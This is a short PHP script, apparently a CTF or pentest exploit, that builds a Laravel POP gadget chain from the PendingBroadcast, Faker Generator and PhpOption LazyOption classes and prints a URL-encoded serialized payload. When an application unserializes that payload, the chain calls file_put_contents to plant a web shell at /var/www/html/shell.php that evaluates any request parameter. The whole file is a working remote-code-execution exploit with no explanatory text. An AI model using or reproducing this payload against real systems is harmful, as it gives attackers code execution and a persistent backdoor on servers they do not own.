<?php

namespace Faker{
    class Generator
    {
        protected $formatters = array();
        public function __construct($formatters)
        {
            $this->formatters = $formatters;
        }
    }
}

namespace Illuminate\Broadcasting{
    class PendingBroadcast{
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace PhpOption{
    final class LazyOption{
        private $callback;
        private $arguments;
        private $option;

        public function __construct($callback, $arguments, $option)
        {
            $this->callback = $callback;
            $this->arguments = $arguments;
            $this->option = $option;
        }

    }
}



namespace{
    $c = new PhpOption\LazyOption('file_put_contents', array('/var/www/html/shell.php', '<?php eval($_REQUEST["jrxnm"]);?>'), null);
    $b = new Faker\Generator(array('dispatch'=> array($c, "filter")));
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, 1);
    echo urlencode(serialize($a));
}